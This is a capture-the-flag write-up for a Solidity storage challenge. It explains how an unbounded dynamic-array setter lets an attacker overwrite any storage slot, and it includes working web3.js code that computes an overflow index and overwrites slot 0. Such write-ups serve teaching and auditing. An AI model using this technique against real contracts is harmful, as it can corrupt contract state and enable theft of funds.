# 12. Mapping

Who needs mappings? I’ve created a contract that can store key/value pairs using just an array.

## Target contract

```solidity
pragma solidity ^0.4.21;

contract MappingChallenge {
    bool public isComplete;
    uint256[] map;

    function set(uint256 key, uint256 value) public {
        // Expand dynamic array as needed
        if (map.length <= key) {
            map.length = key + 1;
        }

        map[key] = value;
    }

    function get(uint256 key) public view returns (uint256) {
        return map[key];
    }
}
```

## Vulnerability

Never write a function similar to `set`. It's a huge liability risk, as you will see such badly written code allows any attacker to overwrite any storage slot as long as you are aware of how storage arrays work. For this challenge, we need to overwrite storage slot 0 to make `isComplete` equal to `true`.

So let's explain that first : storage slot 0 holds an 8 bit boolean value alongside 248 unused bits, storage slot 1 holds the size of the `map` array. Following this logic one might think that the `map` elements are stored at slot 2, 3, etc.. but that is not how it works. In solidity, storage arrays elements are stored sequentially starting from slot `keccak256(slot_of_array_size)`. In our case that is : `keccak256(1)`.

It turns out that this value is : `0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6`.

We can make sure of that by 1) reading that storage slot. 2) Writing to `map[0]` through the `set` function. 3) reading that storage slot again :

1 ) Reading storage slot :
```js
const challengeContract = "0x7D15477db1B38E407D0EC7A8f129bE173CC3C274";
const storageSlot = web3.utils.soliditySha3({ t: "uint256", v: "1" });
const storageSlotvalue = await web3.eth.getStorageAt(challengeContract,storageSlot);

console.log(storageSlotvalue);
// 0x0000000000000000000000000000000000000000000000000000000000000000
```

2 ) Writing `1` to `map[0]` :
```js
const challengeContract = "0x7D15477db1B38E407D0EC7A8f129bE173CC3C274";

const data = web3.eth.abi.encodeFunctionCall(
  {
    name: "set",
    type: "function",
    inputs: [
      { type: "uint256", name: "key" },
      { type: "uint256", name: "value" },
    ],
  },
  [0, 1]
);

await web3.eth.sendTransaction({
  from: accounts[0],
  to: challengeContract,
  data: data,
});
```

3 ) Reading storage slot :
```js
const challengeContract = "0x7D15477db1B38E407D0EC7A8f129bE173CC3C274";
const storageSlot = web3.utils.soliditySha3({ t: "uint256", v: "1" });
const storageSlotvalue = await web3.eth.getStorageAt(challengeContract,storageSlot);

console.log(storageSlotvalue);
// 0x0000000000000000000000000000000000000000000000000000000000000001
```

Alright, so now that we understand how to take advantage of that vulnerability let's use it to solve the challenge. We must write to storage slot 0 and we know that `map[0]` is at storage slot `0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6`, since the index is of type `uint256` we need to provide an index that will be stored to storage slot 0, meaning that we must find the number `x` where ``0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6 + x == 2^256`. Given that a `uint256` can only store values up to `2^256 - 1` , reaching `2^256` overflows and loop backs to 0 which is exactly what we want.

We can find `x` quite easily with :

```js
const storageSlot = new web3.utils.BN(
  "b10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6",
  16
); // slot of map[0]
const overflowBound = new web3.utils.BN(
  "10000000000000000000000000000000000000000000000000000000000000000",
  16
); // 2 ^ 256
const x = overflowBound.sub(storageSlot);

console.log(web3.utils.numberToHex(x));
// 0x4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f30a
```

Now that we have our index, all we need is to make `isComplete` equal `true` at storage slot 0. Thus, we need to write `0x0000000000000000000000000000000000000000000000000000000000000001` to `map[0x4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f30a]` :

```js
const challengeContract = "0x7D15477db1B38E407D0EC7A8f129bE173CC3C274";
const index = "0x4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f30a";
const value = "0x0000000000000000000000000000000000000000000000000000000000000001";

const data = web3.eth.abi.encodeFunctionCall(
  {
    name: "set",
    type: "function",
    inputs: [
      { type: "uint256", name: "key" },
      { type: "uint256", name: "value" },
    ],
  },
  [index, value]
);

await web3.eth.sendTransaction({
  from: accounts[0],
  to: challengeContract,
  data: data,
});
```

You can submit the challenge now !